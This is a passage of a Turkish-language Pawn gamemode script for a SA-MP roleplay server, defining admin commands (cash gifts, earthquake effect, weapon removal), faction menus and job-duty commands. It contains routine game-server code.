	      		SendClientMessage(i, COLOR_ORANGE, mstring);
	      		SetPlayerHealth(i, hp2);
			}
		}
	}
	return 1;
}
/*CMD:namechange(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
		{
		    new pid, imputtext[25];
		    if(sscanf(params, "is", pid,imputtext)) return Ipucu(playerid, "/namechange (ID) (ISIM)");
		    new string[128];
		    format(string, sizeof(string), "[CHANGENAME] %s adli oyuncunun karakter adi %s tarafindan %s olarak degistirildi.", OyuncuAdiniBul(pid), OyuncuAdiniBul(playerid), inputtext);
	        Log(playerid, string);
	        printf(string);
	        format(string, sizeof(string), "[NAMECHANGE MARKET] %s adli oyuncunun karakter adi %s tarafindan %s olarak degistirildi.", OyuncuAdiniBul(pid), OyuncuAdiniBul(playerid), inputtext);
	        Log(pid, string);
         	SetPlayerName(pid, inputtext);
	        KarakterKaydet(pid);
	        new query[128];
			new _text[MAX_PLAYER_NAME+2];
			format(_text, sizeof(_text), "%s", inputtext);
	        //if(strfind(_text, "_", true) != -1) strreplace(_text, "_", " ");
	        format(query, sizeof(query), "UPDATE `karakterler` SET `isim` = '%s' WHERE `id` = '%d'", _text, Karakter[pid][sqlid]);
	        mysql_tquery(1,query);
  			//new string2[34];
			//format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(giveplayerid), giveplayerid);
			//UpdateDynamic3DTextLabelText(tanismaIsim[giveplayerid], GetPlayerColor(giveplayerid), string2);
		}
	}
	return 1;
}*/
CMD:hediyever(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
		{
		    new para2;
		    if(sscanf(params, "d", para2)) return Ipucu(playerid, "/hediyever (para)");
		    new mstring[128];
		    format(mstring, sizeof(mstring), "{FFFFFF}[!] {800000}Admin \"%s\" tüm oyunculara {33aa33}%d$ {800000}hediye etti.", Karakter[playerid][anick], para2);
     		for(new i; i < MAX_PLAYERS; i++)
	       	{
				if(!IsPlayerConnected(i) || IsPlayerNPC(i)) continue;
	      		SendClientMessage(i, COLOR_ORANGE, mstring);
	      		GivePlayerCash(i, para2);
	      		//PlayAudioStreamForPlayer(i, "https://www.eightbornrpg.com/para.mp3");
			}
		}
	}
	return 1;
}
CMD:ivergiduzenle(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
		{
		    new id,deger;
		    if(sscanf(params, "dd", id,deger)) return Ipucu(playerid, "/ivergiduzenle [isyeriid] [vergi]");
    		Isyeri[id][ivergi] = deger;
		}
	}
	return 1;
}

CMD:adeprem(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
		{
		    new mstring[128],mstring2[128];
		    format(mstring, sizeof(mstring), ""C2"(( {f9f9f9}Deprem oluyor, etrafýnýzdaki objeler þiddetli bir þekilde sallanýyor/devriliyor. "C2"))");
		    format(mstring2, sizeof(mstring2), ""C2"(( {f9f9f9}Siren sesini durdurmak için /muzikdurdur komutunu kullanabilirsiniz. "C2"))");
	 		for(new i; i < MAX_PLAYERS; i++)
	       	{
				if(!IsPlayerConnected(i) || IsPlayerNPC(i)) continue;
	      		SendClientMessage(i, -1, mstring);
	      		SendClientMessage(i, -1, mstring2);
	      		SetPlayerEarthquakeEffect(i, 1000);
	      		//depremvakti(i);
	      		PlayAudioStreamForPlayer(i, "https://www.eightbornrpg.com/siren.mp3");
			}
		}
	}
	return 1;
}

CMD:61dolar(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
		{
		    new mstring[128];
		    format(mstring, sizeof(mstring), "{FFFFFF}[!] {800000}Admin \"%s\" tüm oyunculara {33aa33}61$ {800000}hediye etti.", Karakter[playerid][anick]);
     		for(new i; i < MAX_PLAYERS; i++)
	       	{
				if(!IsPlayerConnected(i) || IsPlayerNPC(i)) continue;
	      		SendClientMessage(i, COLOR_ORANGE, mstring);
	      		GivePlayerCash(i, 61);
	      		//PlayAudioStreamForPlayer(i, "https://www.eightbornrpg.com/61dolar.mp3");
			}
		}
	}
	return 1;
}

CMD:gonder(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
		{
		    new pid, pid2, Float:x, Float:y, Float:z, pint, pvw;
		    if(sscanf(params, "ii", pid, pid2)) return Ipucu(playerid, "/gonder (playerid) (gonderilcek playerid)");
		    GetPlayerPos(pid2, x,y,z);
			pvw = GetPlayerVirtualWorld(pid2);
			pint = GetPlayerInterior(pid2);
		    SetPlayerPos(pid, x,y+2,z);
		    SetPlayerInterior(pid, pint);
		    SetPlayerVirtualWorld(pid, pvw);
		    Bilgi(playerid, "Oyuncuyu gönderdiniz.");
		}
	}
	return 1;
}

CMD:sme(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
      		new string[128], saniye, yazi[128];
		    if(sscanf(params, "ds[128]", saniye, yazi)) return Ipucu(playerid, "/sme [Saniye max.300] [Yazý]");
		    if(saniye > 301) return Hata(playerid, "Saniye maksimum 300 olabilir.");
		    format(string, sizeof(string), "[SME] * %s %s", OyuncuAdiniBul(playerid),yazi);
			Log(playerid, string);
			format(string,sizeof(string),"* %s",yazi);
			SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,saniye*1000);
			format(string,sizeof(string),"(( %s %s ))",OyuncuAdiniBul(playerid),yazi);
			SendClientMessage(playerid,0xC2A2DAFF,string);
   			new log[256];
			format(log, sizeof(log), "[SME] * %s: %s", OyuncuAdiniBul(playerid), yazi);
			Log(playerid, log);
	}
	return 1;
}
/*CMD:bindir(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
 		if((Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi]) || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
		    new _pid, _vid;
		    if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncuya yakýn deðilsiniz.");
		    if(sscanf(params, "dd", _pid, _vid)) return Ipucu(playerid, "/bindir [oyuncuID] [aracID]");
		   	PutPlayerInVehicle(_pid, _vid, 3);
		}
		else
		{
		    Hata(playerid, "Ýþbaþýnda deðilsiniz.");
		}
	}
	return 1;
}*/
CMD:silahsil(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
		{
			new pid=-1,mstring[128];
		    if(isnull(params)) return Kullanim(playerid, "/silahsil [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: [silahno (silahno)], [tum (oyuncuid)]");
            sscanf(params, "s[128]i",mstring,pid);
			if(Buysa("tum",mstring))
			{
			    if(!IsPlayerConnected(pid)) return Hata(playerid, "Yanlýþ id belirttiniz.");
			    ResetPlayerWeapons(pid);
				format(mstring, sizeof(mstring), "%s adlý oyuncunun tüm silahlarýný sildiniz.", OyuncuAdiniBul(pid));
				Bilgi(playerid, mstring);
			    format(mstring, sizeof(mstring), "%s sizin tüm silahlarýnýzý sildi.", Karakter[playerid][anick]);
			    Bilgi(pid, mstring);
			    RemovePlayerAttachedObject(pid, gunindex[pid]);
				foreach(new i : Guns)
				{
				    if(OyuncuSilah[i][oyuncuid] == Karakter[pid][sqlid] && OyuncuSilah[i][durum] != 4)
				    {
				        OyuncuSilah[i][durum] = 4;
						OyuncuSilahKaydetEx(i);
				    }
				}
			}
			if(Buysa("silahno",mstring))
			{
			    if(pid == -1) return Hata(playerid, "Silah no bulunamadý.");
			    new _id=-1;
				foreach(new i : Guns)
				{
				    if(OyuncuSilah[i][no] == pid)
				    {
				        _id = i;
				        break;
				    }
				}
				if(_id == -1)
				{
				    Hata(playerid, "Silah no bulunamadý.");
				    return 1;
				}
				format(mstring, sizeof(mstring), "%d nolu silahý sildiniz.", pid);
				Bilgi(playerid, mstring);
   				foreach(new i : Player)
	   			{
	   			    if(Karakter[i][sqlid] == OyuncuSilah[_id][oyuncuid])
	   			    {
	   			        RemovePlayerWeapon(i, OyuncuSilah[_id][silahid]);
	   			    }
				}
				OyuncuSilah[_id][durum] = 4;
				OyuncuSilahKaydetEx(_id);
			}
		}
	}
	return 1;
}
CMD:birlik(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
		if(Karakter[playerid][level] < 3) return Hata(playerid, "Bu komutu kullanabilmek için en az 3. seviye olmanýz gerekmektedir.");
	    if(Karakter[playerid][birlik] != 0)
	    {
			FactMenu(playerid);
		}
		else
		{
		    if(!BirlikKurmaPos(playerid))
		    {
			    Hata(playerid, "Herhangi bir birlikte deðilsiniz.");
			    Ipucu(playerid, "Birlik kurmak istiyorsanýz birlik kurma yerine gidip /birlik komutunu kullanabilirsiniz.");
				return 1;
			}
			if(Karakter[playerid][birlik] != 0) return Hata(playerid, "Birlik kurmak için öncelikle birliðinizden çýkmalýsýnýz.");
   			if(KarakterOzellik[playerid][Liderlik] < 5) return Hata(playerid, "Birlik kurmak için liderlik özelliðinizin 5. seviye olmasý gerekiyor.");
			new mstring[256];
			for(new i = 0; i < sizeof(FactionTypes); i++) {
				format(mstring, sizeof(mstring), "%s%s\t("DOLAR"$"C1"%d)\n", mstring, FactionTypes[i][Name], FactionTypes[i][Cost]);
				//format(mstring, sizeof(mstring), "Legal\nÇete\t\t ("DOLAR"$"C1"5.000)\nMafya\t\t ("DOLAR"$"C1"10.000)\nYarýþ\t\t ("DOLAR"$"C1"5.000)\nHastahane\t ("DOLAR"$"C1"200.000)\nHaber\t\t ("DOLAR"$"C1"200.000)");
			}
			ShowPlayerDialog(playerid, 342, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Birlik Kur", mstring, "Birlik Kur", "Ýptal");
		}
	}
	return 1;
}
stock FactMenu(id)
{
	new mstring[1024], nstring[128], onlinesayi=0, aracsayi=0, _rutbesayi=12, onlinesure=0;
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"%s",Birlik[Karakter[id][birlik]][fisim]);
	foreach(new i : Player)
	{
	    if(Karakter[i][birlik] == Karakter[id][birlik])
	    {
	        onlinesayi++;
	        onlinesure += Karakter[i][oyunsure];
	    }
	}
	for(new i=0;i < MAX_VEHICLES;i++)
	{
	    if(Arac[i][abirlik] == Karakter[id][birlik])
	    {
	        aracsayi++;
	    }
	}
	new ctext[7];
	switch(FEngel[Karakter[id][birlik]])
	{
		case 0:ctext = "Açýk";
		case 1:ctext = "Kapalý";
	}
	new Float:aktiflik = float((onlinesure*100) / (SQLGetFactionUsers(Birlik[Karakter[id][birlik]][sqlid])*4*7));
	if(aktiflik > 100) aktiflik = 100;
	if(Birlik[Karakter[id][birlik]][seviye] == 1) _rutbesayi=12;
	if(Birlik[Karakter[id][birlik]][seviye] == 2) _rutbesayi=15;
	if(Birlik[Karakter[id][birlik]][seviye] == 3) _rutbesayi=17;
	if(Birlik[Karakter[id][birlik]][seviye] >= 4) _rutbesayi=20;
	format(mstring, sizeof(mstring), "Ýþlem\t#\n"NOKTA" "C2"Bilgi\n"NOKTA" "C2"Araç Al-Çýkart\n"NOKTA" "C2"Rütbe Ýsimleri\t "C2"["C1"%d"C2"]\n"NOKTA" "C2"Davet Et\n"NOKTA" "C2"Online\t "C2"["C1"%d"C2"]\n"NOKTA" "C2"Üyeler\t "C2"["C1"%d"C2"]\n"NOKTA" "C2"Toplam Online Saat\t "C2"["C1"%d saat"C2"]\n"NOKTA" "C2"Aktiflik\t "C2"["C1"%s%.0f"C2"]\n"NOKTA" "C2"Kasa\n"NOKTA" "C2"Araçlar\t "C2"["C1"%d"C2"]\n"NOKTA" "C2"Oyuncu Çýkar",_rutbesayi, onlinesayi,SQLGetFactionUsers(Birlik[Karakter[id][birlik]][sqlid]),onlinesure,"%",aktiflik,aracsayi);
	return ShowPlayerDialog(id, 217, DIALOG_STYLE_TABLIST_HEADERS, nstring, mstring, "Seç", "Ýptal");
}
forward KontrolEdiver(playerid);
public KontrolEdiver(playerid) {
	new Float:x, Float:y, Float:z;
	GetPlayerCameraFrontVector(playerid, x, y, z);
  	#pragma unused x
	#pragma unused y
	if(z < -0.8)
	{
		TogglePlayerControllable(playerid, 1);
		SendClientMessage(playerid, -1,"{be9b7b}[SÝSTEM] {FFFFFF}Hile kontrolü yapýldý.");
		SendClientMessage(playerid, -1,"{be9b7b}[SÝSTEM] {FFFFFF}Durum: Hile.");
		if(Karakter[playerid][adminlevel] < 1)
		{
			KickEx(playerid);
		}
	}
	else
	{
		TogglePlayerControllable(playerid, 1);
		SendClientMessage(playerid, -1,"{be9b7b}[SÝSTEM] {FFFFFF}Hile kontrolü yapýldý.");
		SendClientMessage(playerid, -1,"{be9b7b}[SÝSTEM] {FFFFFF}Durum: Temiz.");
	}
	return 1;
}
stock IsVehicleInUse(vehicleid)
{
    foreach(new i : Player)
    {
        if(GetPlayerVehicleID(i) == vehicleid)
        {
            return i;
        }
    }
    return INVALID_PLAYER_ID;
}
CMD:awork(playerid, params[])
{
    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
    {
        if(aDuty[playerid] == 0)
		{
			aDuty[playerid] = 1;
			//SetPlayerColor(playerid, COLOR_GREEN);
			//SetPlayerSkin(playerid, Karakter[playerid][askin]);
			Bilgi(playerid, "Awork oldunuz. (/admins)");
			//UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), Karakter[playerid][anick]);
			//SetPlayerName(playerid, Karakter[playerid][anick]);
		}
		else if(aDuty[playerid] == 1)
		{
			aDuty[playerid] = 0;
			//SetPlayerSkin(playerid, Karakter[playerid][skin]);
			Bilgi(playerid, "Aworkten çýktýnýz. (/admins)");
			SetPlayerColor(playerid,COLOR_WHITE);
			//SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			new string2[34];
			format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
			if(Karakter[playerid][isbasi]) SetPlayerColor(playerid, 0x8D8DFFFF);
			//UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
		}
	}
	return 1;
}
CMD:awork2(playerid, params[])
{
    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
    {
        if(aDuty[playerid] == 0)
		{
			UpdateDynamic3DTextLabelText(aworkIsim[playerid], 0x800000FF, "[ADMIN]");
			aDuty[playerid] = 1;
			aDuty2[playerid] = 1;
			SetPlayerColor(playerid, 0x800000FF);
			//SetPlayerSkin(playerid, Karakter[playerid][askin]);
			Bilgi(playerid, "Awork oldunuz. (/admins)");
			//UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), Karakter[playerid][anick]);
			SetPlayerName(playerid, Karakter[playerid][anick]);
		}
		else if(aDuty[playerid] == 1)
		{
			aDuty[playerid] = 0;
			aDuty2[playerid] = 0;
			UpdateDynamic3DTextLabelText(aworkIsim[playerid], 0x800000FF, "");
			//SetPlayerSkin(playerid, Karakter[playerid][skin]);
			Bilgi(playerid, "Aworkten çýktýnýz. (/admins)");
			SetPlayerColor(playerid,COLOR_WHITE);
			SetPlayerName(playerid, Karakter[playerid][kisim]);
			if(Karakter[playerid][isbasi]) SetPlayerColor(playerid, 0x8D8DFFFF);
			//UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
		}
	}
	return 1;
}
CMD:twork(playerid, params[])
{
    if(Karakter[playerid][tester] >= 1)
    {
        if(tDuty[playerid] == 0)
		{
			tDuty[playerid] = 1;
			Bilgi(playerid, "Twork oldunuz. (/helpers)");
		}
		else if(tDuty[playerid] == 1)
		{
			tDuty[playerid] = 0;
			Bilgi(playerid, "Tworkten çýktýnýz. (/helpers)");
		}
	}
	return 1;
}
forward vrespawn();
public vrespawn()
{
    new u[MAX_VEHICLES];
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerInAnyVehicle(i)) u[GetPlayerVehicleID(i)]=1;
    }
    for(new i;i<MAX_VEHICLES;i++)
    {
        if(IsTrailer(i) == 1)
        {
            u[i]=1;
        }
        if(u[i] != 1)
        {
            SetVehicleToRespawn(i);
        }
        else continue;
    }
    SendClientMessageToAll(COLOR_ORANGE, "Kullanýlmayan tüm araçlar respawnlandý.");
    return 1;
}
stock IsTrailer(vehicleid)
{
	new mdl = GetVehicleModel(vehicleid);
	if(mdl == 435 || mdl == 450 || mdl == 569 || mdl == 570 || mdl == 584 ||
	mdl == 590 || mdl == 591 || mdl == 606 || mdl == 607 || mdl == 608 ||
	mdl == 610 || mdl == 611) return 1;
	return -1;
}
stock IsABike(veh)
{
  new bike = GetVehicleModel(veh);
  if(bike == 509 || bike == 510 || bike == 481) return 1;
  return 0;
}

stock IsAMotorBike(veh)
{
  new mbike = GetVehicleModel(veh);
  if(mbike == 448 || mbike == 461 || mbike == 462 || mbike == 463 || mbike == 468 || mbike == 471 || mbike == 521 || mbike == 522 || mbike == 581 || mbike == 586) return 1;
  return 0;
}

CMD:masasandalye(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    new mstring[64];
    	if(sscanf(params, "s[64]", mstring)) return Kullanim(playerid, "/masasandalye [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, kaldir");
    	if(strcmp("kur", mstring, true) == 0)
    	{
    	    if(Karakter[playerid][kodes] > 0) return Hata(playerid, "Hapisteyken bu komutu kullanamazsýnýz.");
    	    if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Bu komutu araç içerisinde kullanamazsýnýz.");
		    if(IsValidDynamicObject(sandalyeobje[playerid])) return Hata(playerid, "Zaten kurulu sandalyeniz var.");
		    new Float:px, Float:py, Float:pz, Float:pangle;
		    GetPlayerPos(playerid, px, py, pz);
		    GetPlayerFacingAngle(playerid, pangle);
	 		sandalyeobje[playerid] = CreateDynamicObject(1825, px, py, pz-1, 0, 0, pangle, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
	 		Bilgi(playerid, "Sandalye kurdunuz.");
	 		//EditDynamicObject(playerid, sandalyeobje[playerid]);
	 		new string[128];
	        format(string, sizeof(string), "{7EFB1A}%s",OyuncuAdiniBul(playerid));
			SandalyeLabel[playerid] = CreateDynamic3DTextLabel(string,-1,px, py, pz-0.4, 10, .worldid=GetPlayerVirtualWorld(playerid),.interiorid=GetPlayerInterior(playerid));
            Streamer_Update(playerid);
		}
		else if(strcmp("kaldir", mstring, true) == 0)
		{
			if(IsValidDynamicObject(sandalyeobje[playerid]))
		    {
				DestroyDynamicObject(sandalyeobje[playerid]);
				DestroyDynamic3DTextLabel(SandalyeLabel[playerid]);
				Streamer_Update(playerid);
				Bilgi(playerid, "Sandalyeyi kaldýrdýnýz.");
		    }
		    else
		 	{
		 	    Hata(playerid, "Sandalye kurmamýþsýnýz.");
		    }
		}
	}
	return 1;
}
CMD:otobus(playerid, params[])
{
	if(IsPlayerInAnyVehicle(playerid))
	{
		if(otobuste[playerid] == 0)
		{
			if(Karakter[playerid][meslek] == 6)
			{
			    new mstring[64];
    			if(sscanf(params, "s[64]", mstring)) return Kullanim(playerid, "/otobus [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: basla, bitir");
    			if(strcmp("basla", mstring, true) == 0)
    			{
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 437 && GetPlayerVehicleSeat(playerid) == 0)
					{
					    Bilgi(playerid, "Otobüs seferine baþladýnýz, checkpointleri takip ediniz.");
					    otobuste[playerid] = 1;
					    Karakter[playerid][pCheckpoint] = 10;
	        			SetPlayerCheckpoint(playerid, 1172.6190,-1834.1420,13.4051, 5.0);
	        			MotoruAciliyor[GetPlayerVehicleID(playerid)] = true;
						MotoruAc(GetPlayerVehicleID(playerid), playerid);
					}
					else
					{
					    Hata(playerid,"Otobüse binmeniz gerekmektedir.");
					}
				}
				else if(strcmp("bitir", mstring, true) == 0)
				{
					if(otobuste[playerid] == 1)
					{
					    new vid = GetPlayerVehicleID(playerid);
						SetPlayerPos(playerid, Veriler[otobusX], Veriler[otobusY], Veriler[otobusZ]);
					    SetVehicleToRespawn(vid);
					    Bilgi(playerid, "Otobüs seferini iptal ettiniz.");
				     	DisablePlayerCheckpoint(playerid);
						Karakter[playerid][pCheckpoint] = 0;
						otobuste[playerid] = 0;
						MotoruKapat(vid);
						Aractamiri(vid);
					}
					else
					{
					    Hata(playerid, "Otobüs seferinde deðilsiniz.");
					}
				}
			}
			else
			{
			    Hata(playerid, "Otobüs þöförü deðilsiniz.");
			}
		}
		else
  		{
  		    Hata(playerid, "Zaten otobüs seferindesin.");
  		}
	}
	else
	{
		Hata(playerid, "Otobüs seferine çýkmak için otobüste olmanýz gerekmektedir.");
	}
	return 1;
}

CMD:bagliaraclar(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
		    new mstring[128], cezaa=0;
		    SendClientMessage(playerid, TENRENGI, "______________BAÐLI-ARAÇLAR______________");
		    for(new vid;vid < MAX_VEHICLES;vid++)
		    {
		        if(cezali[vid] > 0)
		        {
					cezaa++;
					format(mstring, sizeof(mstring), "[ID:%d] Model:%s - Sahip:%s - Plaka:%s - Ceza Ücreti:%d",vid,VehicleName[GetVehicleModel(vid)-400][0],SQLFromName(Arac[vid][aowner]),Arac[vid][aplaka],cezali[vid]);
					SendClientMessage(playerid, COLOR_WHITE, mstring);
		        }
		    }
		    if(cezaa == 0)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "Cezalý araç bulunmamaktadýr.");
		    }
		}
	}
	return 1;
}
stock split2(const strsrc[], strdest[][], delimiter)
{
        new i, li;
        new aNum;
        new len;
        while(i <= strlen(strsrc)){
                if(strsrc[i]==delimiter || i==strlen(strsrc)){
                        len = strmid(strdest[aNum], strsrc, li, i, 128);
                        strdest[aNum][len] = 0;
                        li = i+1;
                        aNum++;
                }
                i++;
        }
        return 1;
}
PizzaPara(playerid)
{
	new parandom;
	parandom = randomEx(25,30);
	return floatround(parandom*UstalikKatSayi(playerid));
}
KKontrol(playerid)
{
    if(Karakter[playerid][meslek] == 6 && GetVehicleModel(GetPlayerVehicleID(playerid)) == 437) return 1;
	return 0;
}
CMD:meslek(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    new mstring[64];
    	if(isnull(params)) return Kullanim(playerid, "/meslek [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: gir, ayril, isbasi, bul");
        sscanf(params, "s[64]", mstring);
		if(strcmp("isbasi", mstring, true) == 0)
		{
		    if(meslekbul[playerid] == 1) return Hata(playerid, "Önce meslek bul komutunu kapatýnýz.");
			/*if(Karakter[playerid][meslek] == 2)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15, Veriler[taksiX], Veriler[taksiY], Veriler[taksiZ]))
				{
					if(tisbasi[playerid] == 0)
					{
					    tisbasi[playerid] = 1;
						new nstring[128];
						format(nstring, sizeof(nstring), "[LS Taksi] 7/24 hizmetinizde! Ýletiþim: %s - 444", OyuncuAdiniBul(playerid));
						SendClientMessageToAll(0x00C300FF, nstring);
						Bilgi(playerid, "Ýþbaþý oldunuz.");
					}
					else if(tisbasi[playerid] == 1)
					{
					    tisbasi[playerid] = 0;
					    Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
					}
				}
				else Hata(playerid, "Meslek iþbaþý olma yerinde deðilsiniz.");
			}
			else */
			if(Karakter[playerid][meslek] == 4)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15.0, Veriler[pizzaX],Veriler[pizzaY],Veriler[pizzaZ]))
			    {
			        if(!Karakter[playerid][misbasi])
			        {
			            Karakter[playerid][misbasi] = 1;
			            PizzaGorevde[playerid] = 1;
			            Bilgi(playerid, "Ýþbaþý yaptýnýz, göreve baþlayabilmek için motorlardan birine binmelisiniz.");
			            SetPlayerSkin(playerid, 167);
					}
					else
					{
					    Karakter[playerid][misbasi] = 0;
					    PizzaGorevde[playerid] = 0;
					    Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
					    SetPlayerSkin(playerid, Karakter[playerid][skin]);
					    DisablePlayerCheckpoint(playerid);
					}
				}
				return 1;
			}
			else if(Karakter[playerid][meslek] == 5)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15.0, Veriler[aracsicilX],Veriler[aracsicilY],Veriler[aracsicilZ]))
			    {
			        if(!Karakter[playerid][misbasi])
			        {
			            Karakter[playerid][misbasi] = 1;
			            SicilTGorevde[playerid] = 1;
			            SetPlayerColor(playerid, COLOR_RED);
			            new string2[34];
						format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
						UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			            Bilgi(playerid, "Ýþbaþý yaptýnýz, göreve baþlayabilmek için meslek araçlarýndan birine binmelisiniz.");
			        }
			        else
			        {
			            Karakter[playerid][misbasi] = 0;
			            SicilTGorevde[playerid] = 0;
			            Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
						SetPlayerColor(playerid, COLOR_WHITE);
						new string2[34];
						format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
						UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			        }
			    }
			}
			else if(Karakter[playerid][meslek] == 7)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15.0, Veriler[temizlikX],Veriler[temizlikY],Veriler[temizlikZ]))
			    {
			        if(GetPVarInt(playerid, "TIsbasi") != 1)
			        {
			            SetPVarInt(playerid, "TIsbasi", 1);
			            Bilgi(playerid, "Ýþbaþý yaptýnýz, göreve baþlayabilmek için araçlardan birine binmelisiniz.");
					}
					else
					{
					   	SetPVarInt(playerid, "TIsbasi", 0);
					    Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
					}
				}
				return 1;
			}
			else if(Karakter[playerid][meslek] == 8)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15.0, 2219.3762,-2666.3638,13.5399))
			    {
			        if(!Karakter[playerid][misbasi])
			        {
			            Karakter[playerid][misbasi] = 1;
			            KamGorevde[playerid] = 1;
			            if(Karakter[playerid][cinsiyet] == 1) { SetPlayerSkin(playerid, 206); }
			            if(Karakter[playerid][cinsiyet] == 2) { SetPlayerSkin(playerid, 69); }
			            SetPlayerColor(playerid, COLOR_RED);
			            new string2[34];
						format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
						UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			            Bilgi(playerid, "Ýþbaþý yaptýnýz, göreve baþlayabilmek için meslek araçlarýndan birine binmelisiniz.");
			        }
			        else
			        {
			            Karakter[playerid][misbasi] = 0;
			            KamGorevde[playerid] = 0;
			            SetPlayerSkin(playerid, Karakter[playerid][skin]);
			            Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
						SetPlayerColor(playerid, COLOR_WHITE);
						new string2[34];
						format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
						UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			        }
			    }
			}
			else if(Karakter[playerid][meslek] == 9)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15.0, 2448.8557,-2620.3879,13.6572))
			    {
			        if(!Karakter[playerid][misbasi])
			        {
			            Karakter[playerid][misbasi] = 1;
			            EleGorevde[playerid] = 1;
			            if(Karakter[playerid][cinsiyet] == 1) { SetPlayerSkin(playerid, 206); }
			            if(Karakter[playerid][cinsiyet] == 2) { SetPlayerSkin(playerid, 69); }
			            SetPlayerColor(playerid, COLOR_RED);
			            new string2[34];
						format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
						UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			            Bilgi(playerid, "Ýþbaþý yaptýnýz, göreve baþlayabilmek için meslek araçlarýndan birine binmelisiniz.");
			        }
			        else
			        {
			            Karakter[playerid][misbasi] = 0;
			            EleGorevde[playerid] = 0;
			            SetPlayerSkin(playerid, Karakter[playerid][skin]);
			            Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
						SetPlayerColor(playerid, COLOR_WHITE);
						new string2[34];
						format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
						UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			        }
			    }
			}
			else if(Karakter[playerid][meslek] == 10)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15.0, 2281.1309,-2365.0793,13.5469))
			    {
			        if(!Karakter[playerid][misbasi])
			        {
			            Karakter[playerid][misbasi] = 1;
			            LojGorevde[playerid] = 1;
